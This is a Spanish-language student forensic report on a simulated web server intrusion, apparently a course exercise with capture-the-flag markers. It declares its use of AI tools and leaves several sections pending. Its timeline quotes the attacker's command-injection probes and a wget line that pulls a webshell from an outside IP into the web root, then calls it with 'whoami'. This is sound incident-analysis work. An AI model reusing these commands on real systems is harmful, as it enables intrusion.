# Informe forense — Incidente PhantomCorp (phantomcorp-web)

**Grupo:** 06
**Fecha:** 2026-10-23
**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión + exfiltración

| Nombre y apellido | Usuario de GitHub |
|---|---|
| Martín Beccereca | martinbeccereca |
| Belén Benito | belubenito01 |
| Alejo José De Miguel | AlejoDM |
| Tomás Giudici | TomasGiudici |
| Carolina Suppo | carosuppo |

## 0. Declaración de uso de IA

**Herramienta:** Claude Code.

- **Finalidad del uso:** apoyo para ejecutar el análisis de R1 (vector de entrada/RCE en `access.log`) y para redactar la estructura inicial del informe.
- **Partes asistidas:** estructura del informe, nota de custodia de R1 en la sección 2, y la respuesta a P1.
- **Verificación:** la búsqueda en `logs/access.log` se hizo con `grep` sin modificar el archivo original; la decodificación URL del parámetro `cmd` se hizo sobre el string extraído, no sobre el log. La discrepancia de `shasum -a 256 -c` en el checkout local se confirmó como un artefacto de conversión de finales de línea de Windows al comparar contra el contenido comiteado en git. Se revisó el contenido antes de incorporarlo.

**Herramienta:** Codex (OpenAI).

- **Finalidad del uso:** apoyo para examinar en modo solo lectura el artefacto defanged del webshell de R2 y el historial extraído de memoria para P4, y para redactar el aporte documental.
- **Partes asistidas:** correlación log–disco de R2, IOC del webshell, eventos de timeline vinculados, respuesta P4, bitácora y salidas de evidencia.
- **Verificación:** los valores, rutas, horas y líneas incorporados se contrastaron con las salidas crudas guardadas. No se ejecutó, reconstruyó ni modificó el contenido del webshell; el equipo debe revisar este texto y conservar la declaración solo si representa el uso real de IA.

## 1. Resumen del incidente

*Pendiente de completar cuando estén los 5 hallazgos (R1–R5).*

## 2. Cadena de custodia

*Verificación completa pendiente (R5). Nota parcial de P1, relacionada con R1:*

Antes de analizar `logs/access.log` se corrió `shasum -a 256 -c evidencia.sha256` desde `caso/`. En el checkout local (Windows) el comando devolvió `FAILED`/`No such file or directory` para los 9 archivos del manifiesto. Esto es un falso positivo del entorno: Git tiene `core.autocrlf=true` y convierte los finales de línea de LF a CRLF al clonar en Windows, lo que deja un `\r` colgando en cada nombre de archivo listado por `evidencia.sha256` y rompe la búsqueda por nombre; no es evidencia de alteración por sí solo. Ver [salida completa del comando](evidencia/salidas/r1-custodia-check.txt).

Como control, se calculó el hash de `logs/access.log` contra el contenido tal como está comiteado en git (`git show HEAD:... | sha256sum`), que no pasa por esa conversión. Ese hash coincide con el registrado en `evidencia.sha256`: el archivo usado para R1 está íntegro. La verificación de los 9 archivos y la identificación del que sí está alterado quedan para la sección de R5.

## 3. Línea de tiempo del ataque

| Hora (UTC) | Evento | Evidencia (archivo:línea) |
|---|---|---|
| 05/Sep/2026 02:18:10 | `185.220.101.42` consulta `GET /api/reporte?...&cmd=id`: primera prueba de ejecución de comandos contra el endpoint. Confirmado por la respuesta `200`. | `logs/access.log:18` |
| 05/Sep/2026 02:18:33 | Misma IP envía `cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p` (URL-encoded). Decodificado: `echo FLAG{dfir_vector_sqli} > /tmp/.p`. Confirma que el parámetro `cmd` se ejecuta como comando del sistema — este es el vector de entrada/RCE (R1). | `logs/access.log:19` |
| 05/Sep/2026 02:19:02 | La misma IP usa el canal RCE para ejecutar `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`. El listado de disco ubica ese archivo a las 02:19 y la evidencia defanged lo identifica como webshell; la coincidencia de ruta y minuto confirma la correlación log–disco. | `logs/access.log:20`; `disco/listado.txt:4`; `disco/var/www/uploads/shell.php.evidencia.txt:1-9` |
| 05/Sep/2026 02:19:48 | La misma IP solicita `/uploads/shell.php?c=whoami` y recibe `200`. Esto es consistente con el uso posterior del webshell descargado; el log no muestra el cuerpo de respuesta ni permite atribuir una identidad real al atacante. | `logs/access.log:21`; `disco/var/www/uploads/shell.php.evidencia.txt:5-10` |

**R2 — webshell:** la evidencia de disco contiene `FLAG{dfir_webshell_hallado}`; el extracto completo y la correlación con el log están en [r2-webshell-disco.txt](evidencia/salidas/r2-webshell-disco.txt). La flag fue registrada con el verificador oficial tras normalizar a LF la copia temporal de los scripts y manifiestos utilizados por el verificador ([envío aceptado](evidencia/salidas/r2-submit.txt)).

## 4. Indicadores de compromiso (IOCs)

| Tipo | Valor | Dónde apareció |
|---|---|---|
| IP atacante | `185.220.101.42` | `logs/access.log:18-20`: origen de las tres peticiones al endpoint `/api/reporte?cmd=` (probe `id`, marcador de RCE, descarga del webshell). Es la IP que aparece en el log; no se verificó identidad real detrás de ella. |
| IP/puerto C2 | | |
| Archivo malicioso | `/var/www/uploads/shell.php` | `disco/listado.txt:4` lo sitúa a las 02:19; `disco/var/www/uploads/shell.php.evidencia.txt:1-9` lo describe como webshell defanged, con parámetro `c` y comentario de descarga desde `45.13.37.7`. La descarga y posterior solicitud figuran en `logs/access.log:20-21`. |
| Usuario backdoor | | |
| Persistencia | | |

## 5. Alcance del daño

*Pendiente de completar.*

## 6. Contención y erradicación (recomendaciones)

*Pendiente de completar.*

## 7. Preguntas de análisis (P1–P5)

**P1 — ¿Por qué la RAM se captura antes que el disco?**

El orden de volatilidad dice que se captura primero lo que se pierde más rápido. La RAM solo existe mientras la máquina está encendida: procesos en ejecución, conexiones de red activas y, en este caso, el historial de comandos de la sesión del atacante, viven ahí. El disco persiste aunque se apague el equipo, así que puede esperar. Si se captura primero el disco, cualquier cosa que solo estuviera en memoria en ese momento se pierde para siempre apenas el proceso termina o la máquina se reinicia.

En este caso puntual no tengo, desde R1, un ejemplo donde la memoria conservara algo que el disco ya no tenía (eso corresponde al R4, sobre `bash_history` en memoria, fuera de mi análisis). Lo que sí puedo señalar desde R1 es la razón estructural: `access.log` registra que el atacante ejecutó comandos arbitrarios a través del parámetro `cmd` (líneas 18-20), lo cual implica que corrió procesos y, probablemente, abrió conexiones de red (la descarga del webshell con `wget`) que en el momento de la intrusión solo existían como estado de memoria — procesos y sockets activos — y no como artefactos de disco. Si el equipo de respuesta hubiera esperado a capturar disco antes que memoria, esa actividad en curso se habría perdido apenas terminaran esos procesos.

**P4 — El atacante corrió `history -c`. ¿Por qué igual pudiste recuperar sus comandos?**

`history -c` limpia la lista de historial de la shell activa y, en este caso, el artefacto declara que el `.bash_history` de disco fue borrado; no borra retroactivamente una adquisición de memoria ya realizada. El archivo `memoria/bash_history.txt` fue recuperado de memoria y conserva las órdenes previas —incluida la descarga del webshell en la línea 4— y el propio `history -c` en la línea 10 ([evidencia P4](evidencia/salidas/p2-history-memoria.txt)). Por eso la recuperación depende de que la memoria se haya capturado antes de apagar el host o de que el proceso sobrescribiera esas estructuras.

La evidencia permite afirmar que esos comandos estaban presentes en el artefacto de memoria provisto. No permite fijar por sí sola el instante exacto en que se ejecutó cada comando, demostrar que no hubo otras sesiones ni asegurar que toda actividad del atacante quedó recuperada. Para ampliar la atribución o la secuencia temporal harían falta artefactos adicionales, como procesos, sockets, timestamps y logs correlacionados.
